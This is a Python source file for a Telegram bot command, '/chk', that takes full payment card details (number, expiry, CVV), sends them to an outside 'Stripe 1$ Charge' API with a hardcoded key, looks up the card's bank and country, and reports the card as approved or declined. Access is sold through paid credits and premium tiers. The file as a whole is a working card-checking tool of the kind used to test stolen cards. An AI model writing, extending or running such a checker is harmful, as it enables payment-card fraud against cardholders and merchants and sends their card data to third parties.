from pyrogram import Client, filters
import requests, re, time
from plugins.func.users_sql import *

session = requests.Session()

@Client.on_message(filters.command("chk"))
async def cmd_chk(Client, message):
    try:
        user_id = str(message.from_user.id)
        chat_type = str(message.chat.type)
        chat_id = str(message.chat.id)

        await plan_expirychk(user_id)
        regdata = fetchinfo(user_id)
        if str(regdata) == 'None':
            return await message.reply_text("You're not registered. Use /register", message.id)

        status = regdata[2]
        role = status
        credit = int(regdata[5])
        antispam_time = int(regdata[7])
        now = int(time.time())

        if chat_type == "ChatType.PRIVATE" and role == "FREE":
            return await message.reply_text("Only premium users can use this in PM.", message.id)

        if now - antispam_time < (30 if role == 'FREE' else 5):
            wait_time = 30 - (now - antispam_time) if role == 'FREE' else 5 - (now - antispam_time)
            return await message.reply_text(f"⏳ AntiSpam Active\nWait {wait_time} seconds.", message.id)

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit. Use /buy to recharge.", message.id)

        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text.replace('/chk', '').strip()

        match = re.search(r'(\d{12,16})[|:\s,-](\d{1,2})[|:\s,-](\d{2,4})[|:\s,-](\d{3,4})', cc)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv", message.id)

        cc, mes, ano, cvv = match.groups()
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        # Initial message (reply to user message)
        check_msg = await message.reply_text(f"""
┏━━━━━━━⍟
┃  Stripe 1$ Charge
┗━━━━━━━━━━━⊛
⊙ CC: {fullcc}
⊙ Status: Checking...
⊙ Response: Waiting for Response...
""", reply_to_message_id=message.id)

        # API call
        tic = time.perf_counter()
        r = session.get(
            f"https://barryxapi.xyz/stripe_charge?key=BRY-FGKD5-MDYRI-56HDM&card={fullcc}",
            timeout=15
        )

        try:
            data = r.json()
            result = data.get("result", {})
            card_status = result.get("status", "").lower()
            card_message = result.get("message", "No message from gateway")
        except Exception:
            card_status = "error"
            card_message = "Invalid response or server error"

        toc = time.perf_counter()

        # BIN Lookup
        try:
            binres = session.get(f"https://bins.antipublic.cc/bins/{cc[:6]}", timeout=10).json()
            brand = binres.get("vendor") or binres.get("scheme") or binres.get("type") or "UNKNOWN"
            type_ = binres.get("type", "N/A")
            level = binres.get("level", "N/A")
            bank = binres.get("bank", "N/A")
            country = binres.get("country_name", "N/A")
            flag = binres.get("country_flag", "")
        except:
            try:
                bininfo = session.get(f"https://lookup.binlist.net/{cc[:6]}", timeout=10).json()
                brand = bininfo.get("scheme") or bininfo.get("network") or bininfo.get("type") or "UNKNOWN"
                type_ = bininfo.get("type", "N/A")
                level = bininfo.get("brand", "N/A")
                bank = bininfo.get("bank", {}).get("name", "N/A")
                country = bininfo.get("country", {}).get("name", "N/A")
                flag = bininfo.get("country", {}).get("emoji", "")
            except:
                brand = type_ = level = bank = country = flag = "N/A"

        # Format BIN data
        brand = str(brand).upper()
        type_ = str(type_).upper()
        level = str(level).upper()
        bank = str(bank).upper()
        country = str(country).upper()

        # Status label
        if card_status in ["approved", "charged", "insufficient_funds", "incorrect_cvc"]:
            status = "Approved ✅"
        else:
            status = "Declined ❌"

        # Final formatted message
        msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Stripe 1$ Charge</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        # Edit or reply (avoid message not modified)
        if msg.strip() != check_msg.text.strip():
            await Client.edit_message_text(chat_id, check_msg.id, msg)
        else:
            await message.reply_text(msg)

        updatedata(user_id, "credit", credit - 1)
        updatedata(user_id, "antispam_time", now)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")